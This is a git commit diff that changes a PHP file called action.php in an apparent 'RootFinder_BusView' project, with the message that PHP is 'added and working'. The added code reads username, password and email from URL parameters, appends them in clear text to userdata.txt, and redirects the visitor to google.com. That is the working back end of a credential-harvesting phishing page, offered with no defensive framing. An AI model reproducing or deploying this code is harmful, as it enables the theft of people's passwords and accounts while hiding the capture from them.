4d87e7b41ee5298947655b455f6d0a115c23d8d5
Ankit Halder <halderankit9@gmail.com>
2023-08-22 23:27:17 +0530

    php done
    php is successfully added and working

--- RootFinder_BusView/action.php
+++ RootFinder_BusView/action.php
@@ -1,10 +1,8 @@
 <?php
-$file = 'action.php';
-$fp = fopen($file, 'a');
 
-fwrite($fp, $username);
-?>
-<?php
-
-file_put_contents("username.txt","".$username = $_GET['username']. "\n", FILE_APPEND);
+file_put_contents("userdata.txt","username:".$userdata = $_GET['username']. "\n", FILE_APPEND);
+file_put_contents("userdata.txt","password:".$userdata = $_GET['password']. "\n", FILE_APPEND);
+file_put_contents("userdata.txt","mail:".$userdata = $_GET['email']. "\n", FILE_APPEND);
+header("Location: https://google.com");
+exit;
 ?>
